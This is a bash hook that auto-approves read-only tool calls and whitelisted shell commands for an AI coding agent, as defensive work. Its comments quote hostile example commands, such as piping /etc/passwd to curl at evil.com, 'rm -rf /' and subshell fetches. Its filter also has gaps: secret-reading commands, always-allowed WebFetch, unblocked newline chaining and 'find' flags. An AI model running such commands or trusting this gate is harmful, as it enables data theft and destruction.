#!/bin/bash
# permission-auto-approve.sh — PermissionRequest hook
# Auto-approves read-only and safe operations.
# Eliminates "click approve 20 times" friction for ls, cat, git status, etc.
# Source: disler/hooks-mastery + Trail of Bits auto-allow pattern
#
# SECURITY: Rejects any command containing pipe operators (|, &&, ;, $())
# to prevent injection via chained commands (e.g. cat /etc/passwd | curl evil.com)

set -euo pipefail
INPUT=$(cat)

TOOL=$(echo "$INPUT" | jq -r '.tool_name // empty')
CMD=$(echo "$INPUT" | jq -r '.tool_input.command // empty')

# Debug logging
if [ "${DWARVES_KIT_DEBUG:-0}" = "1" ]; then
  echo "[dwarves-kit:permission] tool=$TOOL cmd=$(echo "$CMD" | head -c 80)" >&2
fi

# Always auto-approve read-only tools
case "$TOOL" in
  Read|Glob|Grep|WebSearch|WebFetch)
    echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
    exit 0
    ;;
esac

# Auto-approve safe Bash commands (read-only, non-destructive)
if [ "$TOOL" = "Bash" ] && [ -n "$CMD" ]; then

  # SECURITY GATE: reject any command with pipe operators, subshells, or chaining
  # This prevents injection like: cat /etc/passwd | curl evil.com
  # or: ls && rm -rf / or: echo foo; curl evil.com
  # or: $(curl evil.com) or: `curl evil.com`
  if echo "$CMD" | grep -qE '\||\&\&|;|\$\(|`|>\s|>>' ; then
    [ "${DWARVES_KIT_DEBUG:-0}" = "1" ] && echo "[dwarves-kit:permission] REJECTED: pipe/chain operator in command" >&2
    exit 0  # fall through to normal permission dialog
  fi

  # Whitelist of safe command prefixes (single commands only, pipes already rejected above)
  SAFE_PATTERNS=(
    "^ls\b"
    "^cat\b"
    "^head\b"
    "^tail\b"
    "^wc\b"
    "^echo\b"
    "^pwd$"
    "^find\b.*-name\b"
    "^grep\b"
    "^git\s+(status|log|diff|branch|show|remote|tag)"
    "^git\s+ls-files"
    "^which\b"
    "^type\b"
    "^file\b"
    "^stat\b"
    "^du\b"
    "^df\b"
    "^env$"
    "^printenv\b"
    "^node\s+--version"
    "^npm\s+(list|ls|outdated|view)"
    "^npx\s+prettier\b.*--check"
    "^go\s+(version|env|list)"
    "^python3?\s+--version"
    "^ruff\s+check\b"
    "^cargo\s+(--version|check\b)"
  )

  for PATTERN in "${SAFE_PATTERNS[@]}"; do
    if echo "$CMD" | grep -qE "$PATTERN"; then
      [ "${DWARVES_KIT_DEBUG:-0}" = "1" ] && echo "[dwarves-kit:permission] APPROVED: matched $PATTERN" >&2
      echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
      exit 0
    fi
  done
fi

# Everything else: let the normal permission dialog show
exit 0
